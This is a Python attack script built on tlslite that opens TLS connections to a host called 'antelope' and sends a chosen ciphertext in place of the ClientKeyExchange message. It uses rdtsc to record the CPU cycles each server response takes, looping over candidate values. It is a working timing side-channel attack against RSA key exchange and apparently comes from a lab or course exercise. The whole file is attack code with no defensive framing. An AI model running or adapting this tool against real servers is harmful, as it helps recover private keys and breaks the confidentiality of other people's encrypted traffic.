import argparse
import gc
import socket
import tlslite
import rdtsc
import sympy


from tlslite.handshakesettings import HandshakeSettings


class RSAKeyExchangeAttack(tlslite.keyexchange.RSAKeyExchange):
    def __init__(self, cipherSuite, clientHello, serverHello, privateKey, g):
        super(RSAKeyExchangeAttack, self).__init__(
            cipherSuite, clientHello, serverHello, privateKey
        )
        self.g = g

    def processServerKeyExchange(self, srvPublicKey, serverKeyExchange):
        """Generate premaster secret for server"""
        g_bytes = self.g.to_bytes(length=128, byteorder="big")
        self.encPremasterSecret = g_bytes
        return g_bytes


class AttackTLSConnection(tlslite.TLSConnection):
    """
    Modified version of tlslite.TLSConnection which replaces the handshake
    function with one that sends a predetermined ciphertext, g, instead of
    the ClientKeyExchange message.

    It also measures the CPU clock cycles taken for the server to
    respond and returns this value to the caller of
    performHandshakeAttack().
    """

    def performHandshakeAttack(self, g):
        # This function starts a handshake with its server, sending
        # the <g> instead of the random number in the
        # ClientKeyExchange message.

        # Setup connection object as a client about to start a handshake:
        self._handshakeStart(client=True)

        settings = HandshakeSettings()
        settings = settings.validate()

        self.version = settings.maxVersion

        # TLS handshake/dance:
        # -> ClientHello

        # Defaults from TLSConnection._handshakeClientAsync()
        srpUsername = None
        reqTack = True
        nextProtos = None
        serverName = None
        extensions = None

        # getCertSuites() returns the "plain" RSA cipher suits.
        cipherSuites = tlslite.constants.CipherSuite.getCertSuites(settings)
        certificateTypes = settings.getCertificateTypes()

        # Construct message, then send
        clientHello = tlslite.messages.ClientHello()
        clientHello.create(
            settings.maxVersion,
            tlslite.utils.cryptomath.getRandomBytes(32),
            bytearray(0),
            cipherSuites,
            certificateTypes,
            srpUsername,
            reqTack,
            nextProtos is not None,
            serverName,
            extensions=extensions,
        )

        for _ in self._sendMsg(clientHello):
            pass

        # <- ServerHello
        # <- Certificate
        # <- ServerHelloDone
        for serverHello in self._getMsg(
            tlslite.constants.ContentType.handshake,
            tlslite.constants.HandshakeType.server_hello,
        ):
            pass

        self.version = serverHello.server_version

        if serverHello.cipher_suite not in cipherSuites:
            raise Exception("Server responded with incorrect ciphersuite")
        cipherSuite = serverHello.cipher_suite

        if serverHello.certificate_type not in clientHello.certificate_types:
            raise Exception("Server responded with incorrect certificate type")

        # -> ClientKeyExchange
        # Start the process as normal...
        clientCertChain = None
        privateKey = None

        # <naughty code>
        keyExchange = RSAKeyExchangeAttack(
            cipherSuite, clientHello, serverHello, None, g
        )
        # </naughty code>

        # Start time
        start_time = rdtsc.get_cycles()

        # Continue the process as normal...
        for result in self._clientKeyExchange(
            settings,
            cipherSuite,
            clientCertChain,
            privateKey,
            serverHello.certificate_type,
            serverHello.tackExt,
            clientHello.random,
            serverHello.random,
            keyExchange,
        ):
            pass

        premasterSecret, serverCertChain, clientCertChain, tackExt = result

        try:
            for result in self._clientFinished(
                premasterSecret,
                clientHello.random,
                serverHello.random,
                cipherSuite,
                settings.cipherImplementations,
                None,
            ):
                pass

            masterSecret = result

            return False

        except tlslite.errors.TLSRemoteAlert:
            end_time = rdtsc.get_cycles()
            return start_time, end_time


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("start", type=int, default=1)
    parser.add_argument("end", type=int, default=100)
    parser.add_argument("step", type=int, default=1)
    parser.add_argument("iterations", type=int, default=100)
    args = parser.parse_args()

    gc.disable()
    gc.collect()

    for index in range(args.start, args.end + 1, args.step):
        for iteration in range(args.iterations):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(("antelope", 443))

            connection = AttackTLSConnection(sock)
            start_time, end_time = connection.performHandshakeAttack(index)
            print(index, iteration, start_time, end_time, end_time - start_time)

            connection.close()
            sock.close()

            gc.collect()
